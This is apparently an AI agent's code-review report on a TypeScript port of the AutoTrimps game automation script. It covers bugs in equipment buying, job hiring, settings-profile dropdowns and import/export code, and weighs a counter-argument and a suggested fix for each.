**Sim-visible?** NO. It is an always-true comparison: the trace is identical whether the branch is constant-true or genuinely evaluated, and the two settings it suppresses are never seeded by any fixture. baseline-zero cannot distinguish 'gate passed' from 'gate absent'.

**Trigger.** Any U2 run at the shipped default — `createSetting('Requipzone', …, 'value', -1, …)` (settings-defs.ts:1147). `game.global.world >= -1` is true at world 1 and every world thereafter.

**Actual.** `const zoneGo = game.global.world >= getPageSetting('Requipzone')` is a constant `true`, and it is the FIRST disjunct of the only override gate in the level-buy loop (`zoneGo || underStats || Rgetequipcost(...) <= resourceMaxPercent * owned`, :851-853). So `REquipDamageCutoff` (via `underStats`, :843) and `Requippercent` (via `resourceMaxPercent`, :821) are both dead code for every user who has not manually changed AE: Zone. Separately, the Requipzone tooltip says it is the zone at which AutoEquip 'stops caring … and buys prestiges and equipment as aggressively as it can afford' — but `zoneGo` is read only at :851, inside the level-buy loop; the prestige `do…while` at :803-814 calls `buyPrestigeMaybe` which never reads Requipzone, so prestige buying is unaffected by AE: Zone at any value.

**Expected.** -1 is the off/disable sentinel everywhere else in this same panel (`Requipfarmzone` '-1', `ForcePresZ` -1, `DynamicPrestige2` -1, `wsmax` '-1', `windcutoff` '-1'), so a user setting -1 expects the zone override OFF and instead gets it permanently ON. Either normalise (`<= 0 ⇒ never`, matching how the neighbouring `Requipcapattack`/`Requipcaphealth` normalise `<= 0 ⇒ Infinity` at :818-819), or state the -1 semantics in the tooltip and correct the prestige claim.

**Impact.** OPT-IN SETTING, U2 ONLY, BUT UNIVERSAL WITHIN THAT POPULATION — and the documentation half is unconditional.

Gating chain: Requipon defaults FALSE (settings-defs.ts:1125) and RautoEquip returns at :800 without it; the mainLoop callsite (main-loop.ts:542) sits inside `if (game.global.universe == 2)` (main-loop.ts:431); the panel only renders when radonon (`getPageSetting('radonsettings') == 1`, settings-visibility.ts:97). So nothing here touches a U1 player or a U2 player who left AutoEquip off.

For every U2 player who DID turn AutoEquip on and never typed a number into AE: Zone — i.e. the entire default population of that feature — two of the four gear-restraint controls the panel renders as live (AE: Cut-off / REquipDamageCutoff, AE: Percent / Requippercent) are permanently inert, at world 1 and at every world after. The behaviour lost is the "don't buy while H:D is already fine" brake and the "don't spend more than 1% of stock on one level" brake. What still binds: Requipcapattack/Requipcaphealth (default 50), canAffordBuilding, and smithylogic — so this is not runaway spending, it is loss of restraint up to the level caps. Whether that is net harmful is a STRATEGY question and unmeasured; I am not proposing a default change (game balance / tuning is user-gated, and per repo convention the CONSUMER is fixed before the DEFAULT anyway — flipping -1 to a large number cannot reach existing users, whose localStorage already holds -1).

Severity split, for filing:
- Behaviour (zoneGo constant-true): MEDIUM-LOW. Opt-in, U2-only, user-recoverable, and inherited verbatim from upstream — but silently disables two rendered controls for everyone on the default. Fix shape: normalize like the two adjacent lines (`<= 0 => never`, i.e. `const zoneGo = getPageSetting('Requipzone') > 0 && game.global.world >= getPageSetting('Requipzone')`), matching wsmax / ForcePresZ / DynamicPrestige2. NOTE the cost: 10-hypo-u2 is the one fixture with Requipon:true, so this likely moves its trace and forces an oracle re-record.
- Documentation (the "buys prestiges" claim + Requippercent's "before you reach AE: Zone" + REquipDamageCutoff's incomplete ignoredWhen): HIGH CONFIDENCE, ZERO RISK, and wrong at every setting value, not just the default. Cheap and independently shippable — and per this repo's own convention it should land in a SEPARATE branch from any behaviour change.

Zero risk of a false alarm on CI: the net is structurally blind here, so nothing goes red today either way.

**Strongest counter-argument considered.** The strongest refutation is that "dead code" is the wrong frame: -1 is not unreachable, it is a bad DEFAULT, and any user can revive both settings by typing a number into AE: Zone. On that reading the author simply chose "always aggressive" as the U2 default (radon gear is cheap relative to progression), and the -1 is just an idiomatic "low number" achieving it. Two facts support this: (a) the port is byte-faithful to legacy, so nothing was broken in conversion; and (b) Requipfarmzone at equipment.ts:897 uses the identical unguarded `world >= -1` shape, so this codebase does NOT uniformly treat -1 on a zone threshold as an off sentinel — which directly contradicts the finding's own supporting citation.

Why it does not kill the finding. First, the recovery path is itself incoherent: to restore restraint the user must set AE: Zone to a number they will never reach (9999), which inverts the control's stated meaning ("the zone at which AutoEquip stops caring"), while the natural "I don't want this override" input — -1, the value every sibling in the panel uses for off — turns it permanently ON. Second, Requipfarmzone is not a counterexample but a second instance: it is inert only because it sits in a conjunction with two other -1-defaulted `> 0` guards; move that same expression into a disjunction and it would absorb the gate exactly as Requipzone does. The three settings that genuinely encode "-1 means off" (wsmax, ForcePresZ, DynamicPrestige2) all guard, and the two lines directly above the defect normalize `<= 0`. Third, and decisively, the counter-argument cannot rescue the prose: the "buys prestiges" claim is false at EVERY value of the setting, and REquipDamageCutoff's ignoredWhen is incomplete regardless of what the default should be. Even if the user concludes the default is intentional and WONTFIXes it, the three tooltips still need correcting.

The other refutation I tried and could not sustain: "the sim would have caught it." It cannot — 10-hypo-u2 runs the code with the constant-true gate and the oracle froze that behaviour as correct, which is precisely the class of defect a differential is blind to.

---

### The Requip2 always-level-2 block buys LOCKED equipment and bypasses the Hypothermia wood guard the same function enforces 30 lines later

`src/modules/equipment.ts:824`

**Sim-visible?** PARTIALLY — the two `buyEquipment` calls ARE in the oracle trace, but the trace pins them as correct behaviour; nothing asserts AT should not buy locked gear, so the differential is green either way. Removing the calls would turn baseline-zero RED.

**Trigger.** U2 with `Requipon` on and `Requip2` on (default TRUE, settings-defs.ts:1154), outside Pandemonium. Fires for any `game.equipment[x].level < 2`, including pieces with `locked === 1`, and including Shield during Hypothermia when `Rhyposhouldwood === false`.

**Actual.** `for (const equip in game.equipment) { if (game.equipment[equip].level < 2) buyEquipment(equip, null, true, 1); }` has no `locked` test and no `Rhyposhouldwood` test. The game's `buyEquipment` (.trimps-game/main.js:16730) checks only affordability — never `locked` — so the purchase goes through on gear the player has not unlocked and which `drawAllEquipment` (updates.js:6252-6266) does not even render. The same function refuses locked gear 32 lines later at :856 and refuses Shield-during-Hypothermia at :855, so this block is inconsistent with its own siblings.

**Expected.** Gate the loop on `!game.equipment[equip].locked`, and apply the same `challengeActive === 'Hypothermia' && equip === 'Shield' && !Rhyposhouldwood` skip that :855 applies — the wood-conservation guard exists precisely because Shield is the wood sink during Hypothermia, and the Requip2 pass spends it first.

**Impact.** OPT-IN, U2-ONLY, and split in two.

Gate chain: `Requipon` (settings-defs.ts:1128) defaults **false** — master switch, opt-in — and only renders in U2 (`settings-visibility.ts:441 radonon ? turnOn : turnOff`). Inside it, `Requip2` (settings-defs.ts:1154) defaults **true**, so every U2 player who enables AutoEquip gets this with no further action. RautoEquip is dispatched at `main-loop.ts:542`, inside the `universe == 2` block at :431.

Half 1 — buys locked equipment: DEFAULT PATH for anyone with AutoEquip on. Fires from the first ticks of every U2 run (post-portal all 13 pieces are locked=1/level=0) and again after each prestige. Impact is a PLAYER GAIN of roughly +80 attack/+304 health for ~6.2k metal + 88 wood at run start, and it is the most metal-efficient gear on the board while it lasts. Treat as a balance/behaviour question for the user, not a bug to silently fix. Sim-visible and PINNED — the four calls are in `10-hypo-u2.1.trace.json`, so removing them turns baseline-zero red and requires an oracle re-pin across every src commit since the tag.

Half 2 — Hypothermia wood bypass: DEEP-GAME, CONFIGURED-USER ONLY, and effectively unguarded. Needs U2 + Hypothermia + `Rhypofarmstack` configured above 0 (default `[-1]` ⇒ `hasBonfireTarget` false ⇒ inert, so unconfigured users never see it) + AutoMaps on (the Rhypo reset call lives in RautoMap) + `Shield.level < 2`. Bounded at one Shield level per Supershield prestige: 51 wood at prestige 1 (noise against the 1e10 first bonfire), 1.68e9 at P6, 1.08e12 at P8 — i.e. deep in a bonfire-farming run a single bypassed level can cost about one whole bonfire, which is exactly the resource the guard at :855 exists to protect and which converts directly into Ember stacks (+300% radon each). NOT pinned by any trace: the one fixture in the `Rhyposhouldwood === false` state has Shield at level 10 and Supershield already done, so the differential is silent here in both directions. Low blast radius, but a real and cheap fix.

**Strongest counter-argument considered.** Two, and the first genuinely kills half the finding.

(A) BUYING LOCKED GEAR IS A WIN, NOT A LEAK. The proposed fix ("gate the loop on !locked") would make the player strictly weaker. The levels are not wasted: the stats land in `game.global.attack`/`health` and are never reconciled away (`calcBaseStats`, the one function that excludes locked, is called only from `prestigeEquipment` when `game.global[stat] <= 0`), `unlockEquipment` never resets level, and the locked pieces are the cheapest stat per metal available (Gambeson 10.0 vs 24.6; Arbalest 36.0 vs 100.0). Because `resetGame` reinstantiates `game = newGame()`, all 13 pieces are locked after a portal, so this pass is AT's entire early-gear bootstrap in U2 — removing it is a large, deliberate nerf. Under this repo's rules that is sacrosanct-tuning territory (user decision), not a defect to ship, and it would turn baseline-zero RED (the four tick-0 calls are in the committed oracle).

(B) FAITHFUL TO LEGACY. `git show 93d39b98^:legacy/modules/equipment.js` shows the block character-for-character identical, including the `!= 'Pandemonium'` and the sibling guards 30 lines down. So it is a long-standing upstream behaviour, not a conversion regression — the bar for changing it is "is this what the author wanted", and for the locked half the answer is plausibly yes (Requip2's tooltip says "every U2 weapon and armor piece", and `ignoredWhen` names only Pandemonium).

What survives both: the Hypothermia/Shield skip. It cannot be defended as intentional, because the SAME FUNCTION refuses that exact purchase 29 lines later, and the `Rhypofarmstack` tooltip states the conserve contract in prose. A one-line `&& !(game.global.challengeActive === 'Hypothermia' && equip === 'Shield' && !Rhyposhouldwood)` on the loop body is behaviour-preserving everywhere `Rhyposhouldwood` is true (i.e. every default user, every U1 user, all 12 fixtures' Shield) and only removes the wood spend the guard already forbids.

---

### resetAutoTrimps() populates the profile dropdown TWICE — #72 chained the population into settingsProfileMakeGUI() but left the pre-existing call behind, so every import / profile switch / factory reset duplicates every saved profile

`src/modules/import-export.ts:933`

**Sim-visible?** No. Settings-UI DOM only; not reachable from any wrapped native mutator, and the L0 net never fires an import or a profile switch.

**Trigger.** Have ≥1 saved settings profile. Do any of: paste-import a settings string, switch profiles, or click "Reset to Default" and confirm. Look at the Settings Profile dropdown.

**Actual.** resetAutoTrimps' body runs `initializeAllTabs(); initializeAllSettings(); initializeSettingsProfiles();`. initializeAllSettings() (settings-defs.ts:22) ends at settings-defs.ts:3010 with `settingsProfileMakeGUI()`, which since #72 calls `initializeSettingsProfiles()` itself (:47, added precisely so "whoever renders the control also fills it"). The line-933 call then runs over the same freshly-built <select> and appends every stored profile a second time. Result: [Current, Reset, Save New…, p0…pN-1, p0…pN-1]. The duplicates then poison onDeleteProfile's `index-3` arithmetic — deleting a second-copy row computes a target past the end of the stored array, silently splices nothing, but still removes the dropdown row, leaving DOM and storage out of sync.

**Expected.** One population per rebuild. Since #72 made settingsProfileMakeGUI() self-populating, the standalone call at :933 is now redundant and must be deleted (the boot path, settings-boot.ts:23-30, correctly has no extra call and populates exactly once).

**Impact.** Default-path but narrow-population, MEDIUM-LOW severity, NOT sim-visible.

- **Gate:** none. No AT setting controls this; the Settings Profile dropdown is built unconditionally for every user by `initializeAllSettings`, and `settings-visibility.ts` has no gate for it.
- **Who is hit:** any user with ≥1 saved settings profile who then does a paste-import (`loadAutoTrimps` → `resetAutoTrimps(b)`), a profile switch (`confirmedSwitchNow` → `resetAutoTrimps(data, name)`), or "Reset to Default" (tooltip onclick `resetAutoTrimps()`, `import-export.ts:885`). Note a factory reset only removes the `autoTrimpSettings` key (`:925`), so saved profiles survive and get double-listed. Users with zero saved profiles are unaffected (N=0 → both calls are no-ops).
- **How bad:** the dropdown shows every profile twice until the next page reload. Deleting a second-copy row silently deletes nothing from storage while removing the row and printing a success message; deleting a first-copy row leaves an orphan row that, when selected, silently does nothing. No wrong profile is ever deleted and no settings data is lost; a reload restores the correct list.
- **Regression age:** introduced 2026-07-12 by #72 (`58436bf6`), which added the `:47` call without removing the pre-existing `:933` one. Legacy (`git show 35a098af^:legacy/modules/import-export.js`) populated exactly once.
- **Sim-visibility:** none, and the finder's "No" is correct. `resetAutoTrimps` terminates in settings-UI DOM, never in a wrapped native mutator (`buyJob`/`buyBuilding`/…), and no L0 fixture fires an import or profile switch. `baseline-zero` is structurally incapable of seeing this, so it is unguarded territory — consistent with every settings-defs suite stubbing `settingsProfileMakeGUI` to an empty function.

**Strongest counter-argument considered.** The bug is bounded far more tightly than "duplicates poison the delete arithmetic" suggests, and a reasonable reader could call it cosmetic. Three mitigations I verified rather than assumed:

(a) **No wrong profile is ever deleted, and storage is never corrupted.** I traced the row→target mapping across successive deletes: the first N rows stay index-aligned with storage (deleting a first-copy row shifts both by one; deleting a duplicate row shifts only the DOM and leaves the aligned first block untouched). So every delete either removes the correct entry or removes nothing. There is no data-loss case.

(b) **It does not accumulate and it self-heals.** `settingsProfileMakeGUI` builds a brand-new `<select>` and resets `innerHTML` to the 3 base options each rebuild, so the list is stable at 3+2N no matter how many resets/imports occur in a session (verified: RESET2 = 9, not 12). A page reload goes through `settings-boot.ts`, which populates exactly once, so the correct list is restored.

(c) **Zero-profile users are completely unaffected** — with `ATSelectedSettingsProfile` empty, both calls are no-ops.

The counter fails because the delete path is genuinely user-facing and silently lies: `onDeleteProfile` prints "Successfully deleted profile #: N" for an operation that spliced nothing, and the orphaned duplicate row selects into `confirmedSwitchNow` with no match, no debug line and no error. That is a behavioural regression against legacy (which populated exactly once), not a style issue.

Two things I could NOT fully exclude: the reset path is only reproducible by hand (I was read-only, could not run Chrome or vitest), so my 9-vs-6 number comes from a faithful transcription into jsdom rather than the live bundle; and if `initializeAllSettings()` were ever to throw before line 3010 during a reset, `:933` would be skipped and the duplication would not occur — though that would be a strictly worse bug.

---

### `storedMODULES` is WRITE-ONLY — nothing in the shipped bundle ever reads it back, so the ImportModuleVars tooltip's promise of persistence "between refreshes" is false, and the five MODULE-vars tooltip branches are unreachable anyway

`src/modules/import-export.ts:1156`

**Sim-visible?** No — twice over. The write lives in guiLoop, which per CLAUDE.md never runs in the L0 net (setInterval is stubbed dead at scripts/sim/boot.mjs:31), and "a value that is never read back" produces no native-mutator event by construction.

**Trigger.** Any session: guiLoop writes the key once per second forever. To see the false promise, follow the ImportModuleVars flow (only reachable by calling ImportExportTooltip('ImportModuleVars') from the console, since nothing mounts it) — set a MODULE var, note it persisted to localStorage, refresh, and it is back to the default.

**Actual.** importModuleVars() (:1156-1157) and resetModuleVars() (:1186-1188) both do `localStorage.removeItem('storedMODULES')` + `safeSetItems('storedMODULES', JSON.stringify(compareModuleVars()))`, and main-loop.ts:597 rewrites it from guiLoop every 1000ms. There is no `localStorage.getItem('storedMODULES')` anywhere in src/, scripts/, or .trimps-game/ — the only readers in the repo are four assertions inside the tests that check what was just written. So MODULES overrides never survive a refresh. Separately, the tooltip branches for `ImportModuleVars` (:293), `ExportModuleVars` (:271), `ResetModuleVars` (:323), `ATModuleLoad` (:299) and `ATModuleUnload` (:311) are dead: no createSetting anywhere mounts those ids (settings-defs.ts mounts only ImportAutoTrimps / ExportAutoTrimps / DefaultAutoTrimps / Export60 / Export550 / CleanupAutoTrimps / MagmiteExplain / c2table), and the only other external caller of ImportExportTooltip is other.ts:267 with 'spireImport'.

**Expected.** Either a boot-time restore (loadPageVariables()-equivalent: read storedMODULES, validate through the existing parseModuleVars() grammar, apply) plus a mounted Import/Export MODULE-vars button — or delete the write, the two branches, and the tooltip copy. The tooltip at :294 currently states "Enter your Autotrimps MODULE variable settings to load, and save locally for future use between refreshes", which is a checkable claim and is false in both halves.

**Impact.** **Two separate impacts, and the user-visible one is ~zero.**

- **The write — default path, every user, every second, harmless.** `guiLoop` (`main-loop.ts:597-598`) fires from t=9000 ms onward for every AutoTrimps user regardless of settings. It walks ~97 fields across 12 `MODULES` namespaces, `JSON.stringify`s the diff, and `setItem`s it. For a user with no overrides that is the 2-byte string `{}`; there is no measurable cost and no correctness consequence. This is not a perf finding.

- **The false promise — unreachable, so effectively 0 affected users.** The `ImportModuleVars` tooltip (`import-export.ts:294`) is the only surface stating "for future use between refreshes", and nothing can dispatch to it. Five branches are dead by the same mechanism: `ExportModuleVars` (:271), `ImportModuleVars` (:293), `ATModuleLoad` (:299), `ATModuleUnload` (:311), `ResetModuleVars` (:323). `ATModuleLoad`/`ATModuleUnload` are doubly dead — they `byId('ATModuleListDropdown')`, an element nothing creates (already baselined in `tests/nets/dom-ids.test.ts:278`), and they call `ATscriptLoad`/`ATscriptUnload`, which are deliberate no-ops in the bundled build (`main-loop.ts:37,45`). Reaching any of this requires a console call, and a console user has no reason to prefer it. **Not gated behind a default-off setting — gated behind no setting at all.**

- **The one real casualty class:** several constants have *no* `createSetting` at all (`MODULES.equipment.RnumHitsSurvived`, `MODULES.portal.Rtimeout`, `MODULES.jobs.magmamancerRatio`, …), so `MODULES` mutation is the only way to tune them. A power user who does so loses the change on every reload and, nine seconds later, loses the localStorage record of what they had set. That is a genuine papercut for a vanishingly small population.

- **Corpus visibility: none, twice over** — `guiLoop` never runs in the L0 net (`setInterval` stubbed at `scripts/sim/boot.mjs:31`), and a value read by nothing emits no native-mutator event. Neither `baseline-zero` nor `guard-silence` is evidence about any of this in either direction.

- **Novelty: low.** Both halves are already recorded in-repo — `tests/nets/dom-ids.test.ts:278` ("Reachable only from tooltip branches that nothing calls") and `docs/superpowers/specs/2026-07-13-scientist-percent-design.md:192` ("`storedMODULES` is write-only … ~3 lines to finish"). Neither is an open GitHub issue, so filing is defensible, but this should be labelled a re-discovery.

**Recommended disposition:** the delete arm, not the build arm. Remove the two write sites, the `guiLoop` `atGuard('storedMODULES', …)` block, the five dead branches, and the `ATModuleListDropdown` `KNOWN_DEAD` entry (which then legitimately shrinks, as its own guard test demands). Do **not** implement a boot-time restore without first handling `settings-visibility.ts:1057` — `MODULES.maps.preferGardens` is derived from `PreferMetal` every guiLoop tick, so the persisted diff is not purely user config and a naive restore would replay derived state. The genuinely reusable output here is the `reachability.test.ts` gap: `KNOWN_DEAD` is `[]` and the walk is function-granular, so it certifies as live any function reachable only from a `what ==` branch whose key nothing can produce.

**Strongest counter-argument considered.** **The false promise is unreadable, so it deceives nobody — and the write may never have meant "persistence" at all.**

Two independent lines of attack on the *severity*, neither of which touches the facts:

1. **Unreachable copy cannot mislead.** The `ImportModuleVars` tooltip at `:294` is the only place in the product that promises persistence, and no `createSetting` can dispatch to it. Verified exhaustively: the sole external dispatcher (`settings-engine.ts:282`) is driven by the `defaultValue` of `'infoclick'` settings, all 22 of which I enumerated in `settings-defs.ts`, and none carries a `ModuleVars` key. The mounts were commented out by the upstream author in 2018 (`f5b4d553:NewUI2.js:255-256`) and deleted that August. So the standing trap-4 rationale ("a description promising behaviour the code does not implement is a real finding") is weakened here in a way it was not for `RVoidMaps` (#110) or the #119 tooltip family: those descriptions *rendered*. This one cannot. Zero users can read it without opening a console, and a user in the console who knows to type `ImportExportTooltip('ImportModuleVars')` also knows to re-type `MODULES.jobs.magmamancerRatio = 0.35`.

2. **"Write-only" may be the design, not the bug.** genBTC's originating commit (`54ae56cd`, 2018) says *"Store the diff of our custom MODULES vars in the localStorage **bin**."* A per-second dump of "what has this user overridden" is a perfectly coherent **support/diagnostic artifact** — a thing you ask a player to paste into Discord — and it needs no reader in the bundle to serve that purpose. Under that reading the code is correct and only the orphaned tooltip prose is wrong, which reduces the whole finding to "delete five dead branches and a stale string."

A weaker third attack fails on inspection: one might argue the sim's silence is evidence of harmlessness. It is not — `guiLoop` never runs in the L0 net (`setInterval` stubbed at `scripts/sim/boot.mjs:31`), so the net has no opinion here at all. Citing baseline-zero either way would be the exact error CLAUDE.md warns about.

What survives both attacks: `MODULES` overrides genuinely do not survive a reload, `guiLoop` genuinely destroys the saved blob 9 s into the next session, and the shipped string genuinely claims otherwise. The claim is true; it is its *reach* that is near-zero.

---

### resetAutoTrimps' setTimeout is IMMEDIATELY INVOKED — the same defect #71a documented and fixed in the sibling resetModuleVars, still live here and hidden by an `as any` cast

`src/modules/import-export.ts:923`

**Sim-visible?** No. resetAutoTrimps is reached only from tooltip onclick strings; the L0 net never clicks. tests/import-export.resetModuleVars.test.ts pins the deferral for the FIXED twin only — nothing asserts it for resetAutoTrimps.

**Trigger.** Any call: pasted import (loadAutoTrimps), profile switch (confirmedSwitchNow), or factory reset. All three arrive through inline onclick handlers.

**Actual.** `setTimeout((function(d: any) { … } as any)(a), 101)` evaluates the IIFE first, so the whole teardown/rebuild body (localStorage.removeItem, autoTrimpSettings = d, two removeChild calls, automationMenuSettingsInit, initializeAllTabs, initializeAllSettings, updateCustomButtons, saveSettings, checkPortalSettings) runs SYNCHRONOUSLY inside the click handler, and setTimeout receives the closure's `undefined` return. There is no 101ms defer, so the `ATrunning = !1` … `finally { ATrunning = !0 }` window opens and closes inside one statement and protects nothing — the exact reasoning the #87 comment block above it relies on. Per the HTML spec a non-callable TimerHandler is coerced to a DOMString and compiled as a classic script, so this also schedules a compile of the string "undefined" 101ms later — an implied-eval path in a module whose #76 net exists to keep dynamic-code sinks out of src/.

**Expected.** The same fix already applied to the twin at :1184: `setTimeout(function() { … }, 101)`. resetModuleVars was corrected under #71a with the comment "setTimeout((function(){…})(a), 101) IMMEDIATELY INVOKED the closure and handed setTimeout its undefined return. There was no 101ms defer at all" — that description is still a literal description of line 923.

**Impact.** LOW — latent/maintenance, not a behavioural break. Opt-in-by-click only, and default-path AT never touches it.

Reachability: no setting gates this; it is reached only by explicit user action through inline onclick strings — factory reset (`:885` "Reset to Default Profile"), profile switch (`confirmedSwitchNow`, `:104`), and pasted import (`loadAutoTrimps`, `:959`). A player who never opens the Import/Export tab never executes line 923.

Corpus/sim: structurally invisible. `grep -rn "resetAutoTrimps\|loadAutoTrimps" scripts/sim/` is empty — the L0 net never clicks, so this region is effectively unguarded, and `baseline-zero` is no evidence about it either way.

User-visible harm today: essentially none. The compiled `"undefined"` timer is inert (Chrome 150 reported no uncaught error; the game page ships no CSP). The synchronous ordering is in fact what makes the factory-reset dropdown land on "Reset to Default" instead of snapping back to "Current". The only real cost is error containment (a throw in the rebuild aborts the confirmation tooltip and the onclick tail) plus the latent trap for the next editor.

Recommended disposition: file as a LOW-priority tidy-up, NOT as "apply the #71a fix". Any fix must move `settingsProfiles.selectedIndex = 1` (`:885`) into the deferred body — or, better, simply drop the pointless `setTimeout` wrapper and the `as any` and call the body directly, which preserves today's behaviour exactly, removes the stray timer, and lets tsc see the code again. Also update `mainloop.errorBoundary.test.ts:217-227`, whose comment already flags this as known and out of scope. The double `initializeSettingsProfiles()` duplicate-options bug at `:932-933` is a separate, independently real finding worth its own issue.

**Strongest counter-argument considered.** THE PRESCRIBED FIX ("the same fix already applied to the twin at :1184") IS ACTIVELY WRONG HERE, AND THE "PROTECTS NOTHING" ARGUMENT IS BACKWARDS.

(a) The deferral would REGRESS a visible behaviour. The factory-reset onclick at `:885` is `cancelTooltip(); resetAutoTrimps(); settingsProfiles.selectedIndex = 1;`. `initializeAllSettings()` ends in `settingsProfileMakeGUI()` (`settings-defs.ts:3010`), which builds a BRAND-NEW `<select id=settingsProfiles>` and whose `initializeSettingsProfiles()` sets `selectedIndex = 0` (`import-export.ts:62`). Modelled both orderings on a real jsdom tree:
    boot  : window.settingsProfiles present = true, index = 0
    A) SHIPPED sync : node replaced = true | selectedIndex the user sees = 1 => "Reset to Default"
    B) FIXED defer  : pre-timer index = 1 … after the 101ms body => 0 => "Current"
  Under the sync order the onclick tail lands on the NEW select and the dropdown correctly reads "Reset to Default". Under a real defer it lands on the doomed OLD select and the deferred rebuild snaps the new one back to index 0. The legacy author left the fossil of exactly this attempt at `import-export.ts:88-89`: `//NOPE.XWait 200ms for everything to reset and then re-select the old index. //setTimeout(function(){ settingsProfiles.selectedIndex = index;} ,200);`

(b) There is nothing for the ATrunning window to protect. The body contains no `await`, no yield, no nested timer — it is one synchronous block. JS is single-threaded, so a `setInterval`-driven mainLoop tick cannot interleave with it regardless. The defer's only real effect would be to halt AT for 101 ms and then rebuild the settings DOM against state that has moved on. The claim's "the window opens and closes inside one statement and protects nothing" is true and costs zero correctness.

(c) The #87 comment block at `:913-920` does NOT rely on a defer. It reasons purely about the `finally` restoring the latch, and that genuinely works — `tests/mainloop.errorBoundary.test.ts:217-227` proves it and PASSES today. The claim's "the exact reasoning the #87 comment block above it relies on" overstates.

(d) Fixing it breaks an existing green test: `mainloop.errorBoundary.test.ts:225` asserts `expect(() => window.resetAutoTrimps()).toThrow('injected: initializeAllTabs')`, i.e. the synchronous propagation is currently *specified*, not accidental.

What survives all of that is narrower than the claim: a function that READS as deferred but is not (the exact shape that already cost this repo a session under #71a), a `void`→`TimerHandler` type error masked by a hand-written `as any`, one stray inert `setTimeout(undefined, 101)` per reset, and weaker error containment — a throw in the rebuild propagates out and kills the remaining `debug()` + the user-facing `ImportExportTooltip` confirmation AND the onclick tail, so the user is left with a half-torn-down settings panel and no message at all.

---

### The early-game F/L/M trickle hires LOCKED jobs — AT buys Miners at world 1 before the Miners upgrade is researched

`src/modules/jobs.ts:232`

**Sim-visible?** Partly, and not usefully. Every corpus save is z4+ with F/L/M already unlocked, so the trickle never sees a locked job there; only a fixture that actually portals and replays world 1 with totalHeliumEarned > 5000 would exercise it. And because this is the shipped behaviour, the oracle already pins it — a FIX would show up as a divergence (red), not the bug.

**Trigger.** Any veteran (game.global.totalHeliumEarned > 5000) on the first zone after a portal. The zone-1 bootstrap arm at jobs.ts:182 is skipped for them, execution reaches the trickle at 228-236, and resetGame() has re-instantiated `game = newGame()` (.trimps-game/updates.js:4641), so game.jobs.Miner.locked === 1 and game.jobs.Lumberjack.locked === 1. Miner costs a flat 20 food (config.js:11858), which world-1 manual gathering clears in seconds.

**Actual.** jobs.ts:232/234/235 call safeBuyJob('Miner'|'Farmer'|'Lumberjack', 1) with no `locked` test. Neither the game's buyJob (main.js:5190) nor canAffordJob (main.js:5396) checks `locked` either — that guard lives only in the UI, which never renders a locked job. So AT hires Miners the player has not unlocked; the production loop (main.js:4567) iterates `for (let job in game.jobs)` gated only on `owned > 0`, so those Miners produce metal, while drawAllJobs (updates.js:5840) skips locked rows so they are invisible in the UI. jobs.ts:203-204 has the same hole for Scientist.

**Expected.** AT's other two F/L/M hire sites already carry the check: the zone-1 bootstrap tests `!game.jobs.Lumberjack.locked` (186) and `!game.jobs.Miner.locked` (191), and ratiobuy tests `!game.jobs[job].locked` (284). The trickle and the Scientist bootstrap should use the same guard.

**Impact.** **Default-path, moderate severity, and the fix is oracle-neutral.**

*Who:* `BuyJobsNew` defaults to `1` (`settings-defs.ts:936`) and both `1` and `2` dispatch `buyJobs` every tick in U1 (`main-loop.ts:304-307`), rendered whenever `!radonon` (`settings-visibility.ts:380`). The gate is `totalHeliumEarned > 5000`, crossed within a handful of portals (`12-warp-u1` holds 8286 after 5 portals to z62; `p18` holds 5226 after 18). The `realMax <= 3e5` ceiling keeps the trickle open up to Carpentry 108. So: **the opening of every run, for essentially the entire early/mid-game veteran playerbase.** No setting is needed to reach it and none turns it off short of "Don't Buy Jobs".

*How bad:* measured 37 locked Miners in 20 game-seconds at one representative state; p18 (a real 18-portal save) shows 1 of its 4 workers is a locked Miner. Each costs 20 food, occupies a workspace, and removes a Trimp from the breeding pool, to produce a resource that is off-bottleneck during the window (p18: metal 936/100 needed, wood 81/300 needed). The workers are invisible in the Jobs panel and unfireable by the player, and AT itself will not fire them (all its fire paths are `!locked`-guarded, and `breedFire` is permanently `false`). It is a steady low-grade misallocation plus a bypass of a designed progression gate — not a soft-lock. Scientist has the same hole at `jobs.ts:203-204` (book at world 1 cell 39, 100 food each, capped at 10).

*Guarding:* the region is completely unguarded by the proof net. All 12 `CORPUS` fixtures have `Farmer/Lumberjack/Miner/Scientist.locked = 0`; `11-portal-u1` is the only one that portals and its `totalHeliumEarned = 0` routes its post-portal z1 into the *guarded* arm 182. `p18-z2-balance-stall`, `13-z58-gearwall-u1` and `14-gem-housing-frag-lock-u1` are not in `CORPUS` and have no recorded traces.

*Consequence for fixing:* contrary to the finder's note, **a fix cannot move any committed trace** — no corpus fixture ever reaches the trickle with a locked job. It is safe to add the guard without an oracle re-record. It does need a new L1 test (below) or a new fixture, because `baseline-zero` will stay green either way.

**Exact failing vitest test** (drop into `tests/jobs.actuators.test.ts`'s `jobs.buyJobs` describe; its `beforeEach` already stubs `challengeActive`, `breedFire`, `scienceNeeded`, and `canAffordJob = () => true`). Today it yields `['Miner','Farmer','Lumberjack']` and fails:

```ts
it('the trickle must not hire a game-LOCKED job (veteran, post-portal, Miners unresearched)', () => {
  // resetGame() does `game = newGame()` (updates.js:4641) and does NOT preserve game.jobs /
  // game.upgrades / game.worldUnlocks, so Miner.locked is 1 again after every portal. The Miner
  // book is game.worldUnlocks.Miner at world 1 CELL 29 (config.js:10912) and the upgrade then
  // costs 60 sci / 300 wood / 100 metal — a long window. totalHeliumEarned DOES survive the
  // portal (updates.js:4471/4687), so >5000 skips the locked-GUARDED zone-1 bootstrap at
  // jobs.ts:182 and falls into the trickle at jobs.ts:228, which has no locked test.
  // Real-save witness: tests/fixtures/saves/p18-z2-balance-stall.txt has Miner.locked===1 with
  // Miner.owned===1 (18 portals, 5226 helium).
  ;(globalThis as any).game = makeMinimalGame({
    global: { world: 1, totalHeliumEarned: 8286, challengeActive: '', firing: false, buyAmt: 1, maxSplit: 1 },
    resources: {
      trimps: { owned: 300, realMax: () => 452, employed: 40 }, // breeding 260 > 0.33*452=149.2; 300 < 0.9*452=406.8
      food: { owned: 100000 },
    },
    jobs: {
      Farmer: { owned: 40, locked: false },   // !=0 -> skips the jobs.ts:195 arm
      Miner: { owned: 0, locked: true },      // still locked: the book has not dropped yet
      Lumberjack: { owned: 0, locked: false },
      Scientist: { owned: 0, locked: false },
    },
  })
  jobs.buyJobs()
  // Neither buyJob (main.js:5190) nor canAffordJob (main.js:5396) checks .locked, so this hire
  // SUCCEEDS and yields a worker drawAllJobs never renders (updates.js:5851) and nobody can fire.
  expect(buyJobCalls.map((c) => c.title)).toEqual(['Farmer', 'Lumberjack'])
})
